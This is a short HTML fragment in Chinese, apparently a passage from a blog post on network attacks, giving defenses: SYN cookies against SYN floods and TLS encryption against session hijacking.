 <h1 id="抵抗方法"><a href="#抵抗方法" class="headerlink" title="抵抗方法"></a>抵抗方法</h1><p>对于synflood: 使用tcp cookie可以很好的解决。</p>
 <p>对于session劫持，采用Tls加密通信也可解决。</p>
